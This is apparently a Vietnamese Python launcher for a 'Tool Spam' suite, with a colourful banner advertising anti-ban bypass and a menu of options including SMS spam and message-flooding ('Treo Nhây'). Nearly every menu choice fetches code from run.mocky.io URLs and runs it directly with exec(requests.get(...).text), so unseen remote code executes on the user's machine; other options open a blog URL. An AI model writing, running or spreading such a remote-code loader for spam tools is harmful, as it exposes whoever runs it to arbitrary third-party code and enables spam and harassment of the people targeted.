from urllib.parse import quote
from secrets import compare_digest
import datetime
import os
import ssl
from urllib.parse import urlencode
from http import cookiejar
from urllib3.exceptions import InsecureRequestWarning
import hashlib
import random
try:
    import base64
    from requests.exceptions import RequestException
    import requests
    import pystyle
    from concurrent.futures import ThreadPoolExecutor
    from faker import Faker
    from requests import session
    import concurrent.futures
    
except ImportError:
    import os
    os.system("pip install faker")
    os.system("pip install colorama")
    os.system("pip install requests")
    os.system("pip install pystyle")
    os.system("pip install concurrent.futures")
    os.system("pip install base64")
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import datetime
from datetime import datetime
import requests,json
import uuid
import requests
from time import sleep
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
from pystyle import Colors, Colorate, Write, Center, Add, Box
from time import sleep,strftime
import socket
from pystyle import *
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def runbanner(text, delay=0.001):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

#MÀU
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
kt_code = "</>"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
colors = [
    "\033[1;37m\033[1m",  # Trắng
    "\033[1;32m\033[1m",  # Xanh lá
    "\033[1;34m\033[1m",  # Xanh dương
    "\033[1m\033[38;5;51m",  # Xanh nhạt
    "\033[1;31m\033[1m\033[1m",  # Đỏ
    "\033[1;30m\033[1m",  # Xám
    "\033[1;33m\033[1m",  # Vàng
    "\033[1;35m\033[1m",  # Tím
    "\033[32;5;245m\033[1m\033[38;5;39m",  # Màu đặc biệt
]
def banner():
 banner = f""" \033[32;5;245m\033[1m\033[38;5;39m     _____                       _
\033[1;32m      \_   \_ __ ___  _ __  _   _| |___  ___
\033[1;33m       / /\/ '_ ` _ \| '_ \| | | | / __|/ _ \
\033[1;39m         /\/ /_ | | | | | | |_) | |_| | \__ \  __/
\033[1;35m    \____/ |_| |_| |_| .__/ \__,_|_|___/\___|
\033[1;35m                     |_| 
\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻
\033[1;39m┌──────────────────────── REAL ────────────────────────┐
\033[1;33m ➻ \033[1;39mDEV : Nguyễn Tiến Đạt
\033[1;33m ➻ \033[1;39mFb : 陈嘉宝
\033[1;33m ➻ \033[1;39mSupport : Tiến Đạt ඩ
\033[1;33m ➻ \033[1;39mBypass : Antiban
\033[1;33m ➻ \033[1;39mCoppy : Vip Pro
\033[1;33m ➻ \033[1;39mTool Spam                                          
\033[1;39m└────────────────────────────────────────────────────────┘ 
\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
 
 
# =======================[RUN]=======================#
while True:
	os.system('clear')
	banner()
	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m1\033[1;31m] \033[1;32mTreo Nhây V1     \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
	


	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m2\033[1;31m] \033[1;32mTreo Nhây V2     \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
		

	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m3\033[1;31m] \033[1;32mNhây             \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
	

	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m4\033[1;31m] \033[1;32mTreo Form        \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
	


	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m5\033[1;31m] \033[1;32mTreo Code        \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
		

	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m6\033[1;31m] \033[1;32mTreo Dis         \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
	

	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m7\033[1;31m] \033[1;32mSớ Vip         \033[1;39m               |")
	print("\033[1;39m └──────────────────────────────────────────────┘")


	print("\033[1;39m ┌──────────────────────────────────────────────┐")
	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m8\033[1;31m] \033[1;32mSpam Sms         \033[1;39m             |")
	print("\033[1;39m └──────────────────────────────────────────────┘")
		
	
	
	
	print("\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻")
	chon = input('\033[1;31m[\033[1;33m ✯ \033[1;31m] \033[1;34m>\033[1;31m>\033[1;32m> \033[1;39m[\033[1;31mCHOSE\033[1;39m]\033[1;39m: \033[1;32m')
	print('\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ')
	if chon == '1' :
		exec(requests.get('https://run.mocky.io/v3/096bff60-32e6-486f-8b97-23495742fc0d').text)
	if chon == '2':
		exec(requests.get('https://run.mocky.io/v3/f786956c-ba94-46fc-bb04-00153d0548c3').text)
	if chon == '3' :
		exec(requests.get('https://run.mocky.io/v3/aafa4f25-f3a7-465f-951c-b072a6285e56').text)
	if chon == '4' :
		exec(requests.get('https://run.mocky.io/v3/2422a7b4-afaf-4ce5-af14-29f7d7b6c12e').text)
	if chon == '5' :
		exec(requests.get('https://run.mocky.io/v3/2acbf5ef-69e8-4102-a6e4-36cf9254a1d3').text)
	if chon == '6':
		exec(requests.get('https://run.mocky.io/v3/2e4ac4aa-1f36-47aa-91ad-e72b8d71cc74').text)
	if chon == '7' :
		exec(requests.get('https://run.mocky.io/v3/a5618bae-f4be-4e86-b148-164ebffa0f24').text)
	if chon == '8' :
		exec(requests.get('https://run.mocky.io/v3/ef6729a1-1548-48cf-ab14-363208f48b59').text)
	if chon == '9' :
		exec(requests.get('https://run.mocky.io/v3/3a6ec16a-3f13-478a-a400-69622182a268').text)
	if chon == '10' :
		exec(requests.get('https://run.mocky.io/v3/e6235911-8862-43cc-9561-ed7453b9aadb').text)
	if chon == '11':
		exec(requests.get('https://run.mocky.io/v3/fca278a6-c1b8-40df-a35a-2115a45e2781').text)
	if chon == '12' :
		exec(requests.get('https://run.mocky.io/v3/d38cfa2b-28ab-44ff-8ede-813898ff941f').text)
	if chon == '13' :
		exec(requests.get('https://run.mocky.io/v3/91bcc211-369d-4c2c-9e89-650e1e9271ad').text)
	if chon == '14':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '15':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '16':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '17':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '18' :
		exec(requests.get('https://run.mocky.io/v3/3a6ec16a-3f13-478a-a400-69622182a268').text)
	if chon == '19' :
		exec(requests.get('https://run.mocky.io/v3/4b6ca251-283b-4d49-85e9-cd0a731485ec').text)
	if chon == '20' :
		exec(requests.get('https://run.mocky.io/v3/7c0b1444-8685-4a33-98c8-18713bca2211').text)
	if chon == '21' :
		exec(requests.get('https://run.mocky.io/v3/94c0852d-7373-474f-ae39-b2dd2b8d78aa').text)
	if chon == '22' :
		exec(requests.get('https://run.mocky.io/v3/1e0c4843-6aa2-4af0-8955-55fe1e1c4d34').text)
	else :
		continue